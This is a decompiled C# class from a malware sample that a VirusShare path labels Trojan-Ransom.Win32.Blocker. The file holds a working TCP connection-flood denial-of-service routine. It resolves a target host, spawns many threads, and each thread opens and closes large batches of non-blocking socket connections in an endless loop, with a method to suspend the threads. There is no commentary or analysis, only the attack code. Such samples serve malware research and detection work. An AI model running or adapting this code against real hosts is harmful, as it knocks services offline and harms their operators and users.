// Decompiled with JetBrains decompiler
// Type: insomnia.Class22
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 848092D5-5192-4B4F-B8F0-07AD40D025FA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.exyo-803dbe7f976d166aef05102db1219065c8b0bb78e3cf85095fc361f891e6a4e0.exe

using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace insomnia
{
  internal class Class22
  {
    private static ThreadStart[] Field9;
    private static Thread[] Field8;
    public static string Field7;
    private static IPEndPoint Field6;
    public static int Field5;
    private static Class22.Class23[] Field4;
    public static int Field3;
    public static int Field2;
    public static bool Field1 = false;

    public static void Method2()
    {
      try
      {
        Class22.Field6 = new IPEndPoint(Dns.GetHostEntry(Class22.Field7).AddressList[0], Class22.Field5);
      }
      catch
      {
        Class22.Field6 = new IPEndPoint(IPAddress.Parse(Class22.Field7), Class22.Field5);
      }
      Class22.Field8 = new Thread[Class22.Field2];
      Class22.Field9 = new ThreadStart[Class22.Field2];
      Class22.Field4 = new Class22.Class23[Class22.Field2];
      for (int index = 0; index < Class22.Field2; ++index)
      {
        Class22.Field4[index] = new Class22.Class23(Class22.Field6, Class22.Field3);
        Class22.Field9[index] = new ThreadStart(Class22.Field4[index].Method1);
        Class22.Field8[index] = new Thread(Class22.Field9[index]);
        Class22.Field8[index].Start();
      }
    }

    public static void Method1()
    {
      for (int index = 0; index < Class22.Field2; ++index)
      {
        try
        {
          Class22.Field8[index].Suspend();
        }
        catch
        {
        }
      }
    }

    private class Class23
    {
      private IPEndPoint Field3;
      private Socket[] Field2;
      private int Field1;

      public Class23(IPEndPoint ipEo, int SynSockets)
      {
        this.Field3 = ipEo;
        this.Field1 = SynSockets;
      }

      public void Method2(IAsyncResult A_1)
      {
      }

      public void Method1()
      {
label_1:
        try
        {
          while (true)
          {
            this.Field2 = new Socket[this.Field1];
            for (int index = 0; index < this.Field1; ++index)
            {
              this.Field2[index] = new Socket(this.Field3.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
              this.Field2[index].Blocking = false;
              AsyncCallback callback = new AsyncCallback(this.Method2);
              this.Field2[index].BeginConnect((EndPoint) this.Field3, callback, (object) this.Field2[index]);
            }
            Thread.Sleep(100);
            for (int index = 0; index < this.Field1; ++index)
            {
              if (this.Field2[index].Connected)
                this.Field2[index].Disconnect(false);
              this.Field2[index].Close();
              this.Field2[index] = (Socket) null;
            }
            this.Field2 = (Socket[]) null;
          }
        }
        catch
        {
          int index = 0;
          while (true)
          {
            if (index < this.Field1)
            {
              try
              {
                if (this.Field2[index].Connected)
                  this.Field2[index].Disconnect(false);
                this.Field2[index].Close();
                this.Field2[index] = (Socket) null;
              }
              catch
              {
              }
              ++index;
            }
            else
              goto label_1;
          }
        }
      }
    }
  }
}
